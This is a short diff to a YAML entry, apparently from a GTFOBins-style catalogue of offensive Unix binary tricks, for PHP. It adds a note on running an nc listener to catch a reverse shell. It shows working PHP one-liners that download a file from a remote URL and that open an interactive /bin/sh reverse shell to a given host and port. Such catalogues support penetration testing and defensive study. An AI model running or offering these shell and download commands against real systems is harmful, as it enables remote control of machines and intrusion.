@@ -32,7 +32,8 @@ functions:
         export LFILE=file_to_get
         php -r '$c=file_get_contents($_ENV["URL"]);file_put_contents($_ENV["LFILE"], $c);'
   reverse-shell:
-    - code: |
+    - description: Run `nc -l -p 8000` to receive the shell on the other end.
+      code: |
         export RHOST=127.0.0.1 
         export RPORT=8000 
         php -r '$sock=fsockopen($_ENV["RHOST"],$_ENV["RPORT"]);exec("/bin/sh -i <&3 >&3 2>&3");'
